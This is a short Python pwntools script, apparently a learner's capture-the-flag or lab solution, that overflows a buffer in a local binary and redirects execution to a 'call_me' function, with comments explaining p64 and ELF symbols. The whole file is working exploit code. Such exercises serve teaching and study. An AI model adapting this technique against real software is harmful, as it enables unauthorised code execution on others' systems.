from pwn import *

# Load the binary
elf = ELF("./buf-overflow")

# Start the process
p = process("./buf-overflow")

# Find the offset (assumed to be found using cyclic() previously)
offset = 88  # Adjust this based on actual `cyclic_find` results

# Construct the payload
payload = b"A" * offset  # Fill buffer up to return address
#Explain p64 - p64() function is used to convert a 64-bit integer to a little-endian byte string.
#explain elf.sym - elf.sym is a dictionary that contains all the symbols in the binary
#what are symbols - Symbols are the names of functions and variables in the binary
payload += p64(elf.sym["call_me"])  # Overwrite return address with `call_me`

# Send the payload
p.sendlineafter(b": ", payload)

# Get an interactive shell
p.interactive()
